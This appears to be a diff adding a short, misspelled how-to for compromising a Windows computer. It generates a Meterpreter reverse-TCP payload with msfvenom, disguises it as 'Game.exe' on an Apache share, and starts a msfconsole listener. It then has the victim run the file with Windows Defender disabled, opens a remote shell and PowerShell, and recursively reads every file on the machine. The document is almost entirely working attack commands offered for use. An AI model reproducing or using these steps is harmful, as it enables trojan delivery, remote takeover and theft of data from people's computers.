@@ -1,0 +1,46 @@
+virus file:
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86/shikata_ga_nai -b "\x00" LHOST='IP ADRESS' -f exe > /var/www/html/share/Game.exe
+
+starting apache as webserver:
+systemctl start apache2
+now open msfconsole:
+
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhsot 'ipaddress'
+
+for conformation: 
+show option
+
+start exploitation
+exploit -j -z
+
+now from the windows machine:
+open browser 
+search for"http://ipaddress/share"
+now click the game file
+
+run the game file(make sure your windows defender is off)
+
+now from the msfconsole:
+go for,
+sessions
+
+choose the sessions1:
+sessions 1
+
+after enetering the windows:
+shell
+
+creating powershell:
+powershell
+
+change directory:
+cd/
+
+get-childitem -recurse | get-content
+
+by following the above commands u can get the info from the victim computer
+
+ 
